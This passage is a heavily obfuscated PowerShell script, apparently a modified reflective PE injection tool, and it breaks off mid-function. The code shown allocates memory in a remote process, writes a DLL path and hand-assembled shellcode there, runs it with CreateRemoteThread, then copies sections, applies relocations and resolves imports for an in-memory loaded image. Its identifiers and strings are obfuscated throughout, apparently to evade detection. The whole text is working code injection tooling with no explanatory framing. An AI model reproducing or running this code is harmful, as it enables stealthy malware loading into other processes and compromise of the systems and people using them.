        ${PtRs`I`Ze}   =    (  VArIAble  ( "A"+  "L9J"  )  ).VAlue::"s`I`ZeOf"([Type][IntPtr]  )
        ${F`UNCTIOnNaME`pTR}   =   ( VaRIable aL9j -vAluEON  )::(  "{0}{2}{4}{3}{1}" -f'Str','alAnsi','ingToH','lob','G' ).Invoke( ${Fu`NC`TION`NAME})

       
        ${fu`NCTio`NN`AMes`i`ZE}   = [UIntPtr][UInt64]([UInt64]${FU`NcTI`oN`Name}."LEN`Gth" +   1  )
        ${r`F`UNc`NAMEptr} =   ${W`In`32fUnc`TioNS}."vIRTUAL`AllO`CEX"."In`VoKe"(${rEMot`E`PROCHA`N`DLE},  ( VaRiablE  (  'wja'  +  'G7'  ) -VAl )::"Ze`RO", ${fUNcTiON`NAME`s`i`Ze}, ${w`IN3`2cO`NST`ANts}."ME`M_`cOMmIT" -bor ${w`iN`32Con`STa`NtS}."me`m_REs`e`RVe", ${wIN32C`oNS`TANTS}."p`AgE_reA`DWR`I`Te" )
        if ( ${rfu`NCn`Am`epTR} -eq   (  gi  vAriablE:WjAG7    ).ValuE::"Ze`Ro"  )
        {
            Throw "Modified: Unable to allocate memory in the remote process"
        }

        [UIntPtr]${nu`mbyTE`SwRItt`eN}  =   ( cHiLDiteM vaRiaBLE:078M ).VALUe::"ZE`RO"
        ${s`UCC`EsS}  =  ${WIn32`FuN`c`TiO`Ns}."Wr`ItEPrOCESs`meM`Ory"."iN`Voke"(  ${r`eMO`T`ePr`och`ANdLE}, ${RFu`N`c`NAmeptr}, ${fU`Nc`TiONNa`MePTR}, ${f`UNcTIOnnAme`si`Ze}, [Ref]${n`U`mb`yT`eSWrItTEn} )
          ( GEt-variabLe ( 'a' +'l9J'  )    ).VAlUe::("{0}{1}{2}" -f 'Fre','eHGlo','bal').Invoke(${f`U`NctI`onna`m`ePtR})
        if (${sUCC`e`SS} -eq ${FaL`se} )
        {
            Throw "Modified: Unable to write DLL path to remote process memory"
        }
        if ( ${fUNc`T`iOnNAM`EsI`zE} -ne ${n`U`MbYtEs`W`RItten} )
        {
            Throw "Modified: Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
        }

       
        ${K`ErN`El32HAND`le} = ${w`In3`2FUnc`Tio`Ns}."GE`TMOD`ULE`hANDLe"."In`V`Oke"( "kernel32.dll" )
        ${gEtp`R`OCAdDrE`SSAd`dr} =  ${WIN32`Fu`Nc`TIo`NS}."g`etpR`O`CADdr`EsS"."InVO`KE"(${keR`Nel32H`A`N`dlE}, "GetProcAddress"  )


       
        ${G`eT`p`Roc`Ad`DR`EssrETmem}   = ${WIn`3`2F`UNctio`NS}."vIr`TUAlaL`l`oCex"."iN`VO`Ke"(  ${RE`MoTeProC`HAnd`le},   $WjAG7::"Z`eRo", [UInt64][UInt64]${PTRs`i`ze}, ${Wi`N`32ConSta`NTS}."Mem`_co`M`MIT" -bor ${Win3`2cOnS`T`AN`TS}."M`em`_ResErVE", ${wi`N32C`o`N`sTANTs}."p`A`ge_r`EadW`Rite" )
        if (  ${geTpR`o`caDdreSs`RE`Tm`Em} -eq   (  DIR (  "VA"+"Ri"+ "AbL"  +  "E:wjaG" +  "7"  )  ).vAlUE::"Z`ErO" )
        {
            Throw "Modified: Unable to allocate memory in the remote process for the return value of GetProcAddress"
        }


       
       
       
        [Byte[]]${G`e`T`pRocadDRESsSc}   =   @(  )
        if (  ${PEIN`FO}."pE`64`BIt" -eq ${T`RUE}  )
        {
            ${Ge`T`pRO`CA`DDrESS`sC1}   =  @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9 )
            ${G`ET`Pro`caddrEsSSc2} =  @(0x48, 0xba )
            ${geTP`R`OC`AddREs`Ss`C3}  =  @(0x48, 0xb8 )
            ${GETp`ROCa`dd`Re`SSsc4}  = @(0xff, 0xd0, 0x48, 0xb9  )
            ${Ge`TpROca`ddREsSs`c5}   =   @(0x48, 0x89, 0x01, 0x48, 0x89, 0xdc, 0x5b, 0xc3 )
        }
        else
        {
            ${GetpRo`CADDR`EsS`s`c1}  = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xc0, 0xb8 )
            ${Get`PRoc`AddR`EsSS`C2} =   @(0xb9 )
            ${GEtpRoc`A`d`DrESS`SC3}   =  @(0x51, 0x50, 0xb8 )
            ${GetproCadD`Re`SSS`C4}   = @(0xff, 0xd0, 0xb9  )
            ${g`ET`pR`OCaD`DREsSs`c5}   = @(0x89, 0x01, 0x89, 0xdc, 0x5b, 0xc3  )
        }
        ${s`cl`engTH}  =  ${g`eT`ProCaD`dRESSsc1}."LEN`G`Th"  +   ${gEtprO`cA`ddr`E`Ss`SC2}."len`gth"  +  ${GEtP`RocA`dDr`esSSc3}."le`NG`Th"  + ${geTPr`o`CADDre`sS`SC4}."l`eNG`TH"  +   ${GE`Tpr`O`cAdd`R`ESssC5}."LE`N`gth" + ( ${pT`RSI`zE} * 4  )
        ${sc`pS`Mem} =    (   GeT-Item vaRiAbLE:al9J  ).ValuE::( "{0}{1}{2}{3}" -f 'A','lloc','H','Global'  ).Invoke( ${sC`Leng`Th})
        ${sc`psMeM`Origi`NAl} =   ${SC`P`SMEm}

          & (  "{3}{6}{0}{1}{2}{4}{5}"-f 'B','ytesT','oMe','Wr','mor','y','ite-'  ) -Bytes ${GeTPR`O`cAdd`R`ESSs`c1} -MemoryAddress ${s`Cp`SMEm}
        ${scps`mEM}   =   & ("{3}{4}{0}{6}{5}{2}{1}"-f'n','gned','si','Add-','SignedI','sUn','tA'  ) ${scp`smem} (${gEt`Pro`CAdDReS`S`Sc1}."l`eNGtH"  )
          $aL9j::( "{0}{3}{2}{1}"-f'Str','eToPtr','tur','uc'  ).Invoke(${reM`O`T`eD`lLHAnDLE}, ${s`CpSmeM}, ${Fal`se})
        ${Sc`PsM`Em}   =   &  ( "{3}{6}{5}{1}{0}{4}{2}" -f 'IntAsU','gned','d','Ad','nsigne','-Si','d' ) ${S`C`psmeM} (  ${ptrsi`ze}  )
         &( "{1}{0}{2}{3}" -f'Mem','Write-BytesTo','or','y'  ) -Bytes ${g`E`T`PRoCaDDre`ssSc2} -MemoryAddress ${SCP`SMEm}
        ${ScPs`m`Em} =  &  (  "{3}{1}{2}{0}{4}"-f 'Int','Signe','d','Add-','AsUnsigned') ${sc`ps`meM} (  ${GEt`P`Ro`C`ADdRESs`sc2}."LEN`GTh")
          $al9J::(  "{3}{0}{1}{4}{2}" -f 't','ructur','Ptr','S','eTo'  ).Invoke(${RF`UNCNA`mE`P`TR}, ${sC`p`sMem}, ${F`AlSE}  )
        ${scp`S`Mem} =   &(  "{3}{4}{1}{0}{5}{2}"-f 'AsUn','gnedInt','ed','Add-','Si','sign'  ) ${scP`sM`em} ( ${P`TR`SiZE} )
          &( "{1}{3}{2}{0}" -f 'ry','Write-By','sToMemo','te') -Bytes ${G`E`Tpr`oC`ADd`REsssC3} -MemoryAddress ${sCP`S`MEM}
        ${scpsm`Em} =  & ( "{3}{6}{1}{0}{4}{5}{2}"-f 'I','d','ed','Add','ntAsUns','ign','-Signe'  ) ${S`CP`sMem} (${Get`pr`oCaDDR`e`SsSc3}."Le`Ng`Th" )
          (   VarIabLe al9J  -Va )::("{3}{0}{2}{1}" -f'eT','r','oPt','Structur'  ).Invoke( ${getp`ROCaDD`R`eSSAddR}, ${sC`p`SmeM}, ${Fa`lSE} )
        ${SC`pSmeM}  = &  (  "{4}{2}{3}{5}{6}{0}{1}"-f'n','ed','n','edI','Add-Sig','ntAsU','nsig' ) ${S`CPSMem} ( ${p`Tr`siZE})
        & ( "{4}{0}{2}{3}{1}" -f 'ri','ory','te-BytesToM','em','W' ) -Bytes ${gE`TP`Ro`CAdDrESsSC4} -MemoryAddress ${SC`PSm`EM}
        ${S`cpsmeM} =    & ( "{4}{0}{3}{2}{6}{5}{1}" -f'd-','signed','igne','S','Ad','Un','dIntAs' ) ${sc`p`SmEm} (  ${geTpROc`Ad`DReSs`s`c4}."L`en`GtH" )
          $AL9j::("{3}{1}{2}{0}"-f'r','c','tureToPt','Stru' ).Invoke(${gE`T`PRo`CaddR`eSS`ReT`mEm}, ${sC`P`SMEM}, ${F`AL`Se} )
        ${s`cPS`Mem} =    &  ( "{5}{2}{3}{4}{0}{1}{6}"-f'AsUnsig','ne','d','d-Si','gnedInt','A','d' ) ${ScP`smeM} (${PtRs`iZE}  )
          &  (  "{1}{4}{2}{3}{0}"-f 'ry','Wr','ToM','emo','ite-Bytes' ) -Bytes ${G`ETPRO`CADdR`E`SSsc5} -MemoryAddress ${SCps`mem}
        ${sc`p`smEm}  =   &( "{1}{0}{3}{4}{2}"-f'd-','Ad','gned','SignedIn','tAsUnsi'  ) ${SC`ps`mEM} ( ${GEt`Pr`OCaDDR`eSS`s`c5}."L`eNgtH"  )

        ${RScad`Dr}  = ${w`iN32FU`NCT`I`Ons}."virT`U`AlAL`l`oceX"."Invo`ke"( ${REMOtePROC`H`AN`D`Le},  (   VARIabLe Wjag7   ).ValUe::"zE`RO", [UIntPtr][UInt64]${s`cl`engtH}, ${wIN32`CONsT`An`TS}."ME`M_coMM`It" -bor ${w`in3`2conStantS}."m`Em_R`eseRVe", ${Wi`N32cOn`S`Tan`TS}."PaG`e_exE`CU`T`E`_ReADwRiTE")
        if (  ${r`s`cADdR} -eq   (vaRIAbLe  wjag7 ).vaLUe::"z`Ero"  )
        {
            Throw "Modified: Unable to allocate memory in the remote process for shellcode"
        }

        ${S`Ucc`Ess}   =  ${w`in32f`UN`CT`IONs}."W`R`iTeP`ROcEssmemoRy"."i`NvOkE"( ${REMOt`ePRo`chAN`d`lE}, ${rS`C`ADDr}, ${Sc`p`sM`EMoRIGin`AL}, [UIntPtr][UInt64]${SCL`en`GTh}, [Ref]${numByTEsw`R`Itten} )
        if (( ${S`UCCe`SS} -eq ${fa`LSe} ) -or ([UInt64]${NUmBYT`E`SWritt`EN} -ne [UInt64]${SClE`Ngth} ))
        {
            Throw "Modified: Unable to write shellcode to remote process memory."
        }

        ${rtHR`eAd`H`An`dLe}   =  &  ("{4}{1}{0}{3}{5}{2}"-f'reateR','voke-C','d','e','In','moteThrea'  ) -ProcessHandle ${reMOTEP`ROC`hA`NdLe} -StartAddress ${rsC`Ad`DR} -Win32Functions ${W`i`N`32FuN`CTioNS}
        ${re`sU`lT}   =  ${wIn32fu`N`CtIo`NS}."wA`i`TFOR`s`I`NGleoB`jeCt"."i`Nv`OKE"(${rTH`ReAdH`A`NDlE}, 20000 )
        if ( ${res`U`lt} -ne 0)
        {
            Throw "Modified: Call to CreateRemoteThread to call GetProcAddress failed."
        }

       
        [IntPtr]${r`Etu`RnvAlMeM} =    $aL9J::(  "{0}{1}{2}" -f'AllocHGlob','a','l').Invoke( ${p`T`RSIZe} )
        ${rE`SuLT}  =   ${w`IN32FU`N`Ct`IOns}."REaDPr`OC`essmEM`ORY"."iN`Voke"(${REMoteproc`haN`d`le}, ${gE`TProc`AdDReSs`R`eTMEM}, ${R`eT`URNva`l`MEm}, [UIntPtr][UInt64]${P`TrSi`Ze}, [Ref]${NUm`B`YtESwRItT`En})
        if (( ${r`E`sulT} -eq ${fa`lse}) -or (  ${Nu`Mby`TEswrITt`EN} -eq 0) )
        {
            Throw "Modified: Call to ReadProcessMemory failed"
        }
        [IntPtr]${prOC`Addr`ess}  =    (  gEt-vAriAblE ( 'AL9'+ 'J')  -VaLUeonlY   )::"pTRT`o`sTRucT`Ure"(  ${REtu`Rn`VAlmEM}, [Type][IntPtr]  )

        ${Win32`Func`T`IoNs}."ViRTu`Al`Fr`E`EEX"."iN`VoKE"(${R`e`m`otepROc`hAnDle}, ${rS`cAd`Dr}, [UIntPtr][UInt64]0, ${Wi`N32`cOn`STaNTs}."mE`M_rEl`EA`se"  ) |  & (  "{0}{2}{1}"-f'Ou','ull','t-N'  )
        ${wIn32`Fu`NCtioNs}."V`iRTuA`LF`REEex"."iNv`oKE"( ${RE`m`O`Tep`ROchA`Ndle}, ${rFunC`N`Am`epTr}, [UIntPtr][UInt64]0, ${wIn3`2co`NSTAnts}."mEm`_rELE`AsE")   |   &  (  "{0}{1}{2}"-f'O','ut-Nu','ll')
        ${wIn32f`UNc`TI`o`NS}."vI`RTualFR`eEEx"."IN`VOkE"( ${r`EMoTepR`O`chAnd`le}, ${ge`TProcaD`dReSsrEt`MEM}, [UIntPtr][UInt64]0, ${WI`N`32conS`T`ANtS}."MeM`_r`E`lEaSE"  )   | & (  "{1}{2}{0}"-f 'l','O','ut-Nul'  )

        return ${PROC`ADd`R`eSs}
    }


    Function COp`y-`s`ECTIONS
    {
        Param(
        [Parameter(POsITION = 0, mANdAtoRY  =  ${tr`Ue}  )]
        [Byte[]]
        ${P`eBy`Tes},

        [Parameter(  PosiTION  =   1, maNDaTORy = ${tR`Ue}  )]
        [System.Object]
        ${P`EIN`FO},

        [Parameter(poSitIOn   = 2, MANdaTORy =  ${tR`UE} )]
        [System.Object]
        ${Win32F`Un`CTIo`Ns},

        [Parameter(pOsitIoN = 3, MANdaTORY =  ${tr`UE})]
        [System.Object]
        ${W`IN32Ty`pES}
          )

        for(  ${i} =   0  ;  ${I} -lt ${P`eiNfO}."IMAG`e_`Nt_heADeRs"."F`I`LEhEaD`Er"."nUmBerof`sec`Ti`ONs"  ;  ${I}++)
        {
            [IntPtr]${secT`ionh`eAdEr`p`Tr} = [IntPtr](    &  (  "{6}{7}{1}{3}{0}{2}{4}{5}" -f'nedIntA','S','s','ig','Unsigne','d','Add','-'  ) ( [Int64]${pe`info}."SE`cTi`onHe`ADErP`Tr"  ) ( ${I} *   $Al9j::"s`izeof"( [Type]${wi`N32`TYPEs}."IMaGe`_`SECtI`O`N`_hEadEr" ) )  )
            ${SecT`I`oNhE`ADeR}  =     (  chilDITEM VARiAbLE:al9J).valUE::"P`Tr`TOS`TRUCtUre"( ${se`cTI`onheA`derPtR}, [Type]${WiN32`TY`PeS}."imaGe_S`ECTION`_`heADER"  )

           
            [IntPtr]${S`eCTIo`NdEs`TadDR}   = [IntPtr](& ( "{4}{1}{5}{2}{3}{0}"-f 'Unsigned','dd-Sig','edIn','tAs','A','n'  ) ( [Int64]${p`EIn`Fo}."PeH`A`NdLe"  ) ([Int64]${sEctIONh`e`AD`ER}."viRT`U`ALAdD`R`ESS"  ))

           
           
           
           
            ${sIZe`OFr`AwDA`TA}  =  ${seCtio`Nhe`AD`ER}."si`Z`EofRaWDA`TA"

            if (  ${S`Ecti`On`HEaDER}."POIN`T`ERTOrAw`dAtA" -eq 0)
            {
                ${s`IZeOf`Raw`DatA} =   0
            }

            if (${si`zEO`Fr`AwD`Ata} -gt ${s`e`CTIo`NhEader}."V`Ir`TUALSiZE" )
            {
                ${s`iz`E`oF`RawdATA}   =  ${Sec`T`io`NHEadER}."VIR`TuA`LSi`Ze"
            }

            if (${Si`zeOf`RaW`DatA} -gt 0  )
            {
                  &  ( "{3}{0}{5}{1}{4}{2}" -f't-M','moryR','lid','Tes','angeVa','e'  ) -DebugString "Copy-Sections::MarshalCopy" -PEInfo ${pe`iNfO} -StartAddress ${sE`CTI`oN`des`T`AdDR} -Size ${si`Z`E`oFr`Awdata}   |   & (  "{2}{1}{0}"-f 'Null','t-','Ou'  )
                  (  DIr vaRIAble:AL9J    ).ValUe::"c`opY"(${PEby`T`ES}, [Int32]${SecT`iOnhe`A`d`eR}."POIN`TE`RTor`A`wdAta", ${SEC`T`I`OnD`es`TAddr}, ${size`OF`RawdATA})
            }

           
            if ( ${se`C`TioNhe`AdeR}."Siz`EOfRa`wdatA" -lt ${Se`c`Tio`NH`EADer}."viRTUA`L`SI`zE" )
            {
                ${Diff`E`RE`NcE} =  ${SE`C`TIOnHe`ADEr}."Vi`RT`Ua`lSiZE" - ${sIZeofrA`WD`AtA}
                [IntPtr]${sTa`RTadd`RE`SS}   =  [IntPtr]( &(  "{0}{2}{1}{3}{4}" -f 'Ad','IntAsUnsig','d-Signed','ne','d' ) ( [Int64]${SE`Ct`i`oNd`EsTaddr}  ) ([Int64]${SIz`eOfrA`W`data})  )
                  & ("{2}{3}{1}{4}{0}" -f 'id','angeV','Test-Mem','oryR','al' ) -DebugString "Copy-Sections::Memset" -PEInfo ${PE`i`NFO} -StartAddress ${S`TaRT`Ad`D`ReSs} -Size ${D`iFfeRE`NCE}  |  &("{1}{2}{0}" -f '-Null','Ou','t' )
                ${wIN3`2`Fu`N`CtiONS}."MEm`SET"."i`Nv`oKe"(  ${StaR`Tad`d`Re`sS}, 0, [IntPtr]${D`iF`FEREn`Ce} )  | & ("{0}{1}"-f'Out','-Null')
            }
        }
    }


    Function UPd`ATe-`m`Em`oryA`D`dReSSES
    {
        Param(  
        [Parameter(  posiTioN  =  0, mAnDaTOry   = ${t`Rue})]
        [System.Object]
        ${p`E`iNFO},

        [Parameter(  PoSITIon =  1, MandatoRY  =  ${t`RUE}  )]
        [Int64]
        ${oRi`GInAl`i`MageBASE},

        [Parameter(POSitiON =   2, MandaTORY  = ${T`RuE})]
        [System.Object]
        ${WIn3`2`C`ONST`ANts},

        [Parameter(poSition  = 3, MaNDATORy   = ${tr`UE} )]
        [System.Object]
        ${WIn3`2`TypeS}
          )

        [Int64]${based`If`FER`ENce}   =  0
        ${AdD`d`if`FE`REnce}   =   ${t`RuE}
        [UInt32]${imaGEB`ASE`Relo`CsizE}  =    (   gI ( 'V' +  'ARiAbLE:a'  + 'L9J' ) ).VAlUE::"Siz`eof"(  [Type]${WIn32t`Yp`es}."ImaGE_bA`S`E_R`Eloc`ATION"  )

       
        if (  ( ${oRiGiNALiMaG`EB`A`SE} -eq [Int64]${P`einfo}."EFF`EC`TIvepEhA`N`DLe") `
                -or (  ${P`eiNFo}."I`mAG`E_Nt`_HEaD`eRs"."oPtIOnaLh`EaD`er"."bASERe`L`OC`AT`IoNTAB`le"."SI`ZE" -eq 0) )
        {
            return
        }


        elseif ((  &  (  "{0}{4}{2}{3}{5}{1}"-f 'Compare','t','a','l2As','-Val1GreaterThanV','UIn') (  ${oriGINA`l`ImagE`BAse}  ) ( ${pEin`Fo}."Eff`E`CTiVepEHAnd`Le" )  ) -eq ${t`Rue} )
        {
            ${b`AsedIFF`Ere`Nce}   =   &  ( "{3}{0}{1}{2}{4}"-f'n','edIntAsUn','sig','Sub-Sig','ned'  ) ( ${oRIG`i`NAlIM`AGeBAsE}  ) (${Pe`IN`Fo}."ef`FeCtiv`EpE`H`ANdLE")
            ${aDDdi`FfErE`N`Ce}  = ${F`A`LsE}
        }
        elseif ((  &( "{1}{6}{0}{3}{2}{4}{5}" -f'ar','Com','Than','e-Val1Greater','Va','l2AsUInt','p') ( ${p`EIn`FO}."eFfEc`TIVe`pE`hAND`Le") (${ORiGI`NALI`mAG`Eb`ASE} )) -eq ${T`RuE})
        {
            ${b`A`sed`iFfER`EnCe}  = &(  "{2}{0}{6}{4}{3}{5}{1}" -f'ned','d','Sub-Sig','sUnsi','tA','gne','In' ) (  ${peI`N`Fo}."e`FfeCtIVe`pEHANd`Le") ( ${O`Ri`GInaLIMaGEB`ASE}  )
        }

       
        [IntPtr]${b`AsEReL`ocp`TR}  =   [IntPtr](  & ( "{1}{2}{3}{4}{0}"-f 'd','Add-Sig','nedIntAsU','nsi','gne') ([Int64]${p`Ei`NFO}."peH`A`NDlE") ( [Int64]${P`E`info}."Im`AgE_nt_h`EaD`eRs"."oPtiOn`AL`he`AdER"."BaSeRELOCA`T`IONt`A`BLE"."viR`T`UA`LAdDR`ESs"  ))
        while(  ${t`RuE}  )
        {
           
            ${Ba`SEreLoC`AT`ION`TA`BlE} =   ( itEm VaRiablE:Al9j ).VALuE::"ptR`TOSTRu`CT`URE"( ${bAS`e`REloc`p`Tr}, [Type]${win3`2Ty`pES}."imAg`e_b`Ase_ReLoC`AT`ION")

            if (${bAs`ErelOCATIon`Ta`BlE}."siZ`EOF`BL`ocK" -eq 0  )
            {
                break
            }

            [IntPtr]${MemAD`dRbA`Se}  = [IntPtr](   & ("{1}{0}{6}{3}{2}{4}{5}"-f 'dd','A','nt','nedI','AsUnsigne','d','-Sig'  ) (  [Int64]${Pe`in`Fo}."peHAN`DlE" ) ([Int64]${b`AsEr`ElO`cATIO`Nt`AbLE}."v`ir`TUa`laDDrE`Ss"))
            ${N`UmR`elOCaT`Io`NS} =  (${BasE`ReLO`cAT`I`ON`TablE}."si`ZEo`F`BLOck" - ${i`MAGEbaS`EREloc`Si`Ze} ) / 2

           
            for( ${i}   =   0  ; ${i} -lt ${n`UmRElo`caTI`onS}; ${i}++)
            {
               
                ${reL`o`cat`I`o`NiNfOpTR}   =  [IntPtr](&  ("{3}{0}{4}{2}{1}" -f'Si','dIntAsUnsigned','e','Add-','gn') ([IntPtr]${BAs`E`R`elocPTr}  ) ([Int64]${IM`A`GE`BASERELOc`s`IZE} +  ( 2 * ${i})  )  )
                [UInt16]${RE`locatio`N`iNFO} =     $Al9j::"ptRTost`Ru`cT`UrE"(  ${reL`OCAT`io`Ni`NfOpTr}, [Type][UInt16]  )

               
                [UInt16]${rEL`oCoFfS`Et}  = ${r`eLOC`A`TiONIN`Fo} -band 0x0FFF
                [UInt16]${relo`CT`yPe} =   ${reLoc`A`TIonin`FO} -band 0xF000
                for (${j} =   0  ;   ${J} -lt 12  ;  ${J}++)
                {
                    ${RelOC`T`y`PE}   =    (VarIabLE  rVfO -va  )::(  "{1}{0}" -f'loor','F').Invoke( ${rE`l`ocTYpE} / 2 )
                }

               
               
               
                if (  (  ${R`EL`oCtyPE} -eq ${wi`N32cO`N`ST`AnTs}."I`mA`Ge_`REL_BAsEd_hiGHlow" ) `
                        -or ( ${r`eLOc`Type} -eq ${w`In32cON`st`AnTS}."iMa`G`e`_re`l_BAsEd_`dir64") )
                {
                   
                    [IntPtr]${FIN`Ala`DdR}  =   [IntPtr](&  ( "{4}{3}{1}{5}{0}{2}" -f 'nsigne','edIntA','d','Sign','Add-','sU') ([Int64]${m`e`MAdDR`BasE}) ([Int64]${ReLocO`F`FseT})  )
                    [IntPtr]${Cu`RRaD`dR}  =   $AL9J::"pTRTo`st`RUct`U`RE"( ${fin`ALA`Ddr}, [Type][IntPtr])

                    if (${adDD`if`FeRENCe} -eq ${t`Rue})
                    {
                        [IntPtr]${cur`R`A`dDR}   =   [IntPtr](  & (  "{0}{6}{5}{2}{4}{1}{3}"-f'A','si','As','gned','Un','d-SignedInt','d' ) ([Int64]${cUrrAD`Dr} ) (${bA`Se`D`iFFErEN`ce} ) )
                    }
                    else
                    {
                        [IntPtr]${cu`Rr`ADdR}   =  [IntPtr](    & ( "{1}{3}{4}{2}{0}"-f'ned','Su','AsUnsig','b-SignedIn','t'  ) (  [Int64]${cUr`R`ADdR} ) ( ${BASedifF`ERe`NCe}  ) )
                    }

                      (  iTem (  'vA'+ 'RiAblE:a'  +'l9j'  )).ValUE::(  "{1}{2}{3}{0}"-f 'r','Structu','reTo','Pt').Invoke( ${cU`RrA`dDR}, ${fi`N`AlADdr}, ${fAL`se} )  |   &( "{0}{2}{1}"-f 'Out-','ll','Nu')
                }
                elseif (  ${R`ELO`Cty`Pe} -ne ${wI`N3`2cOnSt`AnTS}."imA`ge_re`L_`BAse`d_`ABSolU`Te" )
                {
                   
                    Throw "Modified: Unknown relocation found, relocation value: $RelocType, relocationinfo: $RelocationInfo"
                }
            }

            ${B`AseReL`Oc`ptR}   =  [IntPtr]( & ( "{6}{1}{7}{4}{2}{0}{5}{3}"-f 's','dI','Un','ned','As','ig','Add-Signe','nt') ( [Int64]${bas`e`Rel`Ocptr} ) ( [Int64]${B`A`sErELoCATiOn`TA`BlE}."sI`ZeofBL`OCK"  )  )
        }
    }


    Function IM`P`ORt-DLLim`pORts
    {
        Param(  
        [Parameter(pOSItIOn = 0, mANDATory   = ${tR`Ue})]
        [System.Object]
        ${pe`inFo},

        [Parameter(POSiTiOn  =  1, mAndAToRY   =  ${Tr`UE} )]
        [System.Object]
        ${WiN3`2fU`NCtiOns},

        [Parameter(  POsiTiON  = 2, mAnDATOry = ${TR`UE}  )]
        [System.Object]
        ${w`IN3`2t`YPes},

        [Parameter(  pOsITiON  =   3, maNdATORY =  ${T`Rue}  )]
        [System.Object]
        ${wiN`32c`oNstan`Ts},

        [Parameter( PoSiTiON  =   4, MAnDATOry =  ${fa`l`Se} )]
        [IntPtr]
        ${rEMO`Tep`RO`CH`A`NDle}
        )

        ${Re`MoT`eLoADINg}  =  ${FA`Lse}
        if ( ${P`einfo}."PEHA`N`DLE" -ne ${PEiN`FO}."E`FfeCTi`Ve`PeHAnDle")
        {
            ${rEm`O`TE`lo`ADinG}  =   ${t`RUE}
        }

        if (${p`eInFO}."imA`Ge`_`Nt_hE`AdErs"."O`p`T`io`NAlHeAdER"."Im`porttAb`Le"."s`izE" -gt 0 )
        {
            [IntPtr]${im`p`ORtd`esCrIp`T`ORpTR}  =   & ("{2}{1}{4}{3}{0}"-f'ed','ign','Add-S','ntAsUnsign','edI') ( [Int64]${P`e`iNfo}."Pe`h`AnDlE"  ) ([Int64]${P`EiNfO}."IMAge_N`T_h`E`ADerS"."oPt`IO`NaLh`E`ADEr"."i`MpoRT`TaBle"."vIRT`UAl`A`d`DrESs")

            while ( ${T`RUe})
            {
                ${im`P`ortD`esCRIPtOR} =   ( VARiabLe  ( 'al'  + '9j'  ) -VaLUeONl   )::"pTr`To`stRuCtU`RE"( ${Im`porTdeSc`RI`PtoR`ptr}, [Type]${WiN3`2t`YP`eS}."iMAg`E_I`m`POrt_deSc`Rip`T`or"  )

               
                if (${imPO`RtD`Es`CrIptOR}."c`haRa`CTeriSTI`CS" -eq 0 `
                        -and ${Im`pORTdeSc`RiP`T`OR}."fI`Rs`TtHUnk" -eq 0 `
                        -and ${im`PORTd`ESCRI`P`TOR}."F`orWarder`CHaIN" -eq 0 `
                        -and ${iMPort`desCR`IpT`OR}."nA`mE" -eq 0 `
                        -and ${i`M`poR`TDEscRIpt`OR}."TIMeD`ATesT`A`mp" -eq 0  )
                {
                      &  ( "{3}{0}{2}{1}" -f'rit','erbose','e-V','W'  ) "Modified: Done importing DLL imports"
                    break
                }

                ${iM`p`ORTdll`hAnd`LE}  =    (   Ls  vARIaBlE:WjAG7    ).ValUE::"ze`RO"
                ${Impo`Rt`D`l`lpAThPTr} =   (  &  ( "{5}{3}{1}{2}{4}{0}" -f'signed','g','n','Si','edIntAsUn','Add-') ( [Int64]${PE`iNfO}."P`ehAN`dLe") ([Int64]${IMP`oRT`des`cRIp`Tor}."Na`me" ) )
                ${i`MPORTd`llpATH}  =  ( gET-variable  ( "A" +"L9J"  ) -vALue )::( "{2}{1}{0}"-f 'ngAnsi','i','PtrToStr' ).Invoke(${IMP`ORTD`l`LpaTHPTr} )

                if (${Re`moTELo`Ad`I`Ng} -eq ${t`RuE} )
                {
                    ${im`PORtDl`L`H`An`dle}   =     &( "{4}{3}{6}{2}{5}{0}{7}{1}" -f 'teP','ocess','lInR','m','I','emo','port-Dl','r'  ) -RemoteProcHandle ${REm`ote`PROC`haNDLE} -ImportDllPathPtr ${iMpoR`T`dLl`pATHPtr}
                }
                else
                {
                    ${im`Por`Tdl`lHANDLe}  =   ${Wi`N`32fUN`cTIo`NS}."loa`dL`IBrArY"."i`NVoke"(  ${ImPort`D`Ll`P`ATH}  )
                }

                if (  (${i`MPor`T`dlLhaNdLe} -eq ${N`Ull} ) -or (  ${imPOrT`dll`HA`NdlE} -eq  $WjaG7::"ze`Ro" ) )
                {
                    Throw "Modified: Error importing DLL, DLLName: $ImportDllPath"
                }

               
                [IntPtr]${T`hun`kREF}   =  &  ( "{2}{3}{0}{1}{4}" -f '-Sign','edIntAsUnsig','A','dd','ned' ) (${p`EiN`FO}."pE`h`AnDlE" ) (  ${iMpOrtd`ES`cRi`pT`oR}."fi`RSTtHu`Nk"  )
                [IntPtr]${O`RIG`Ina`l`T`HUnKreF}   =   & (  "{0}{3}{2}{1}" -f 'A','nsigned','ntAsU','dd-SignedI'  ) (${peI`Nfo}."peH`AnD`LE") (  ${Imp`o`RtDE`SCRIPTOr}."cHarActErIS`Ti`Cs"  )
                [IntPtr]${oR`iG`i`NALTHunKreFvaL} =     $AL9J::"pT`RtO`StRUc`Ture"(  ${oR`IgIN`A`LThuNk`REf}, [Type][IntPtr] )

                while (${O`R`igIn`AlTHuN`KrEfVal} -ne  $wJAg7::"z`ErO" )
                {
                    ${pR`O`cE`dUreN`AME} = ''
                   
                   
                   
                    [IntPtr]${NEWT`hu`N`kREf} =     $wJAG7::"Z`ERo"
                    if( [Int64]${O`RiG`iN`AlTHUnK`R`efvAl} -lt 0 )
                    {
                        ${Pr`oC`Ed`Uren`Ame}   = [Int64]${O`RIGinALt`hUn`KrefVAL} -band 0xffff
                    }
                    else
                    {
                        [IntPtr]${stRIN`GA`dDr} = & ( "{4}{5}{1}{6}{3}{0}{2}" -f'si','SignedIn','gned','Un','Add','-','tAs' ) ( ${P`eIn`Fo}."P`eH`ANdlE") (${or`IGinA`lTHU`NKReFV`Al} )
                        ${sTR`iNG`AddR}   =    &  ( "{5}{2}{4}{0}{6}{1}{3}" -f'n','Unsigne','d-Sign','d','edI','Ad','tAs'  ) ${STring`A`D`Dr} (   $AL9J::"sIZ`Eof"([Type][UInt16]) )
                        ${pROCEdUR`e`N`AMe} =    $al9j::(  "{4}{3}{0}{2}{1}"-f 'o','ngAnsi','Stri','trT','P' ).Invoke(  ${S`TrI`NgaddR}  )
                    }

                    if ( ${R`eMO`T`ElOA`diNg} -eq ${t`RuE})
                    {
